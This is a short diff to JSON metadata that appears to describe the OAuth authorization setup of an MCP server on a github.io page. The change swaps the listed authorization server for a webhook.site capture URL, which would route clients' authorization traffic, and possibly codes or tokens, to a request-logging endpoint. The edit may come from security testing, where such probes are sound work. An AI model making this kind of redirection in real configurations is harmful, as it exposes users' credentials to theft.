@@ -1,6 +1,6 @@
 {
   "resource": "https://eib98.github.io",
-  "authorization_servers": ["https://mcp.canva-internal-preview.com"],
+  "authorization_servers": ["https://webhook.site/4c48d3de-d9ce-48f5-b93e-8f7946382194"],
   "scopes_supported": ["read", "write"],
   "bearer_methods_supported": ["header"]
 }
